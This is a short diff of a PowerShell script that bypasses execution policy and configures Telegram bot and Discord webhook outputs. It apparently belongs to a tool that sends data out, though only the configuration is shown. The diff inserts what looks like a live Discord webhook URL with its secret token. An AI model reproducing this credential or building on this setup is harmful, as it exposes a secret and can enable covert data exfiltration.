@@ -4,7 +4,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 # Created by mrproxy
 $botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
 $chatID = "your-chat-id"               # Replace with your Telegram chat ID
-$webhook = "your-discord-webhook-url"  # Replace with your Discord Webhook URL
+$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL
 
 # Debug log file
 $logFile = "$env:TEMP\debug_log.txt"
